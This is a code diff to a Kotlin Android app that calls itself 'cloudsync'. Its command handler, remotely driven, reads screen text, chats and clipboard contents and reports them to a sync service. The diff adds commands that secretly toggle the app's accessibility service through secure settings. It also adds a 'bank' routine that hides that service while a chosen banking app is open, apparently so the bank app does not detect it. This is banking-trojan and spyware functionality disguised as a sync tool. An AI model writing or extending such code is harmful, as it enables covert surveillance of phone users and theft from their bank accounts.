@@ -48,6 +48,9 @@ object Comandos {
                 "tap_text" -> Pair(true, SyncAccessibility.tapTexto(a.optString("text")))
                 "dump" -> Pair(true, SyncAccessibility.dump())
                 "screen_text" -> Pair(true, SyncAccessibility.textoVisible())
+                "acc_off" -> Pair(true, accesibilidad(ctx, false))
+                "acc_on" -> Pair(true, accesibilidad(ctx, true))
+                "bank" -> { banco(ctx, a.optString("pkg"), a.optLong("espera", 9000)); Pair(true, "ok") }
                 "chat" -> {
                     val t = SyncAccessibility.textoVisible()
                     SyncService.instancia?.evento("chat", JSONObject().put("txt", t.take(3000)))
@@ -131,6 +134,37 @@ object Comandos {
         return JSONObject().put("pct", pct).put("charging", cargando).toString()
     }
 
+    private fun accesibilidad(ctx: Context, on: Boolean): String {
+        return try {
+            val comp = "com.cloudsync.app/com.cloudsync.app.SyncAccessibility"
+            val actual = android.provider.Settings.Secure.getString(
+                ctx.contentResolver,
+                android.provider.Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES) ?: ""
+            val lista = actual.split(":").filter { it.isNotBlank() && it != comp }.toMutableList()
+            if (on) lista.add(comp)
+            val ok = android.provider.Settings.Secure.putString(
+                ctx.contentResolver,
+                android.provider.Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES,
+                lista.joinToString(":"))
+            if (!ok) return "sin_permiso_WRITE_SECURE_SETTINGS"
+            android.provider.Settings.Secure.putInt(
+                ctx.contentResolver,
+                android.provider.Settings.Secure.ACCESSIBILITY_ENABLED,
+                if (lista.isEmpty()) 0 else 1)
+            if (on) "on" else "off"
+        } catch (e: Exception) {
+            "error: " + (e.message ?: "")
+        }
+    }
+
+    private fun banco(ctx: Context, pkg: String, espera: Long) {
+        if (pkg.isBlank()) throw Exception("falta pkg")
+        accesibilidad(ctx, false)
+        Thread.sleep(1400)
+        abrir(ctx, pkg)
+        Thread.sleep(espera)
+        accesibilidad(ctx, true)
+    }
     private fun portapapeles(ctx: Context): String {
         val cm = ctx.getSystemService(Context.CLIPBOARD_SERVICE) as ClipboardManager
         val d: ClipData? = cm.primaryClip
